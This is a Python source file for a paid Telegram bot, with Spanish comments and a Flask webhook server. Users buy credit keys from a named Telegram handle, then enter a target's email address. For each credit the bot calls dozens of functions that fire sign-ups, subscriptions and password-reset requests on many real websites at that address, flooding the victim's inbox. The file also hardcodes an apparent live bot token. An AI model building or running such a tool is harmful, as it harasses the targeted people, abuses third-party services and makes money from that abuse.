import os
import telebot
import time
import threading
import requests
from flask import Flask, request
from spammer import (
    send_spam_deia, send_spam_slack, send_spam_emarketingsd, send_recuperar_emarkeyin,
    send_spam_mexicox, send_spam_lagranbodega, reset_password_mexicox, enviar_naturacloud, enviar_elpais,
    recuperar_naturacloud, enviar_recuperar_elpais_v2, registrar_usuario_petco, enviar_suscripcion_axelspringer,
    enviar_email_ibm, registrar_virgin, start_gandhi_login, send_gandhi_access_key, enviar_nanopay,
    enviar_codigo_freecodecamp, enviar_registro_outdooractive, registrar_strikingly, enviar_heb,
    start_elektra_login, send_elektra_access_key, start_doto_login, send_doto_access_key,
    registrar_macstore, registrar_clip, registrar_puntoferta, registrar_ynab, pectov2_restablecer,
    virginv22_recuperar_contrasena, outdooractivev2_recuperar_contrasena, strikinglyv2_recuperar_contrasena,
    hebv2_recuperar_cuenta, macstorev2_recuperar_cuenta, puntoofertav2_recuperarcontraseña,
    ynabv2_recuperarcontraseña, send_spam_pintalibre, send_spam_cheaf, send_spam_lavaperia, send_spam_vapelab, send_spam_tryp, send_spam_cigis, send_spam_ivapeo, recover_password_ivapeo, recover_password_lavaperia, recover_password_tryp, recover_password_vapelab, recover_password_pintalibre, recover_password_cigis, restablecer_contraseña_cheaf 
)

API_TOKEN = '7119344534:AAGloICq0pD5RWhDM-lQYUcKzDZ3uZ912LA'

bot = telebot.TeleBot(API_TOKEN)

# Crear una instancia de Flask
app = Flask(__name__)

# Diccionario para almacenar información de usuarios
users_data = {}

# Leer las keys desde el archivo
def load_keys(filename="keys.txt"):
    keys = {}
    try:
        with open(filename, "r") as file:
            for line in file:
                key, credits = line.strip().split(",")
                keys[key] = int(credits)
    except FileNotFoundError:
        print(f"El archivo {filename} no fue encontrado.")
    return keys

# Guardar las keys actualizadas en el archivo
def save_keys(keys, filename="keys.txt"):
    with open(filename, "w") as file:
        for key, credits in keys.items():
            file.write(f"{key},{credits}\n")

# Validar una key
def validate_key(user_key):
    return user_key in keys and keys[user_key] > 0

# Cargar las keys al iniciar
keys = load_keys()

@app.route('/')
def home():
    return "Bot en funcionamiento"

@app.route('/' + API_TOKEN, methods=['POST'])
def telegram_webhook():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return '!', 200

# Procesar la key ingresada
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "¡Hola! Por favor ingresa tu 'key' de acceso. Adquiérela con @juanper33z.")
    bot.register_next_step_handler(message, get_key)

# Procesar la key ingresada
def get_key(message):
    user_key = message.text.strip()
    if validate_key(user_key):
        users_data[message.chat.id] = {'key': user_key, 'credits': keys[user_key]}
        bot.send_message(
            message.chat.id,
            f"Key validada. Créditos disponibles: {keys[user_key]}. ¿Cuántas veces deseas repetir el proceso? (1 crédito por iteración)."
        )
        bot.register_next_step_handler(message, get_repeats)
    else:
        bot.send_message(
            message.chat.id,
            "Key inválida o sin créditos. Por favor, ingresa una nueva key o compra una con @juanper33z."
        )
        bot.register_next_step_handler(message, get_key)

# Obtener número de repeticiones
def get_repeats(message):
    try:
        repeats = int(message.text.strip())
        user_key = users_data[message.chat.id]['key']

        if repeats <= 0:
            bot.send_message(message.chat.id, "Ingresa un número mayor a 0.")
            bot.register_next_step_handler(message, get_repeats)
            return

        if repeats > keys[user_key]:
            bot.send_message(
                message.chat.id,
                f"No tienes suficientes créditos. adquiere con @juanper33z. Créditos disponibles: {keys[user_key]}."
            )
            bot.register_next_step_handler(message, get_repeats)
            return

        users_data[message.chat.id]['repeats'] = repeats
        bot.send_message(message.chat.id, "Ingresa tu correo electrónico para continuar.")
        bot.register_next_step_handler(message, get_email)
    except ValueError:
        bot.send_message(message.chat.id, "Por favor, ingresa un número válido.")
        bot.register_next_step_handler(message, get_repeats)

# Procesar el correo y ejecutar el proceso
def get_email(message):
    email = message.text.strip()
    users_data[message.chat.id]['email'] = email
    user_key = users_data[message.chat.id]['key']
    repeats = users_data[message.chat.id]['repeats']

    for i in range(repeats):
        if keys[user_key] <= 0:
            bot.send_message(message.chat.id, "Créditos agotados. Adquiere más con @juanper33z. Proceso detenido.")
            break

        # Consumir 1 crédito por iteración
        keys[user_key] -= 1
        save_keys(keys)

        # Ejecutar todas las funciones de spam
        try:
            send_spam_deia(email)
            send_spam_slack(email)
            registrar_macstore(email)
            send_spam_emarketingsd(email)
            send_recuperar_emarkeyin(email)
            registrar_virgin(email)
            send_spam_mexicox(email)
            send_spam_lagranbodega(email)
            reset_password_mexicox(email)
            enviar_naturacloud(email)
            enviar_elpais(email)
            recuperar_naturacloud(email)
            enviar_recuperar_elpais_v2(email)
            registrar_usuario_petco(email)
            enviar_suscripcion_axelspringer(email)
            enviar_email_ibm(email)
            enviar_nanopay(email)
            enviar_codigo_freecodecamp(email)
            enviar_registro_outdooractive(email)
            registrar_strikingly(email)
            enviar_heb(email)
            send_spam_pintalibre(email)
            registrar_clip(email)
            registrar_puntoferta(email)
            registrar_ynab(email)
            pectov2_restablecer(email)
            virginv22_recuperar_contrasena(email)
            outdooractivev2_recuperar_contrasena(email)
            strikinglyv2_recuperar_contrasena(email)
            hebv2_recuperar_cuenta(email)
            macstorev2_recuperar_cuenta(email)
            puntoofertav2_recuperarcontraseña(email)
            ynabv2_recuperarcontraseña(email)
            send_spam_pintalibre(email)
            enviar_heb(email)
            send_spam_cheaf(email)
            send_spam_lavaperia(email)
            send_spam_vapelab(email)
            send_spam_ivapeo(email)
            send_spam_cigis(email)
            send_spam_tryp(email)
            recover_password_ivapeo(email)
            recover_password_lavaperia(email)
            recover_password_tryp(email)
            recover_password_vapelab(email)
            recover_password_pintalibre(email)
            recover_password_cigis(email)
            restablecer_contraseña_cheaf(email)
            bot.send_message(message.chat.id, f"SPAM {i + 1} completado. Créditos restantes: {keys[user_key]}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error al SPAM {i + 1}: {e}")

    bot.send_message(message.chat.id, "¡Proceso completado! autor: @Juanper33z")

# Keep-alive function
def keep_alive():
    while True:
        try:
            requests.get("https://booottttspaaam-gocf.onrender.com")  # Reemplaza con tu URL en Render.
            time.sleep(600)  # Envía solicitudes cada 10 minutos.
        except Exception as e:
            print(f"Error en keep-alive: {e}")

# Ejecuta el Keep-Alive en un hilo separado
threading.Thread(target=keep_alive, daemon=True).start()

# Establecer el webhook
bot.remove_webhook()
bot.set_webhook(url='https://booottttspaaam-gocf.onrender.com/' + API_TOKEN)

# Ejecutar el servidor Flask
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
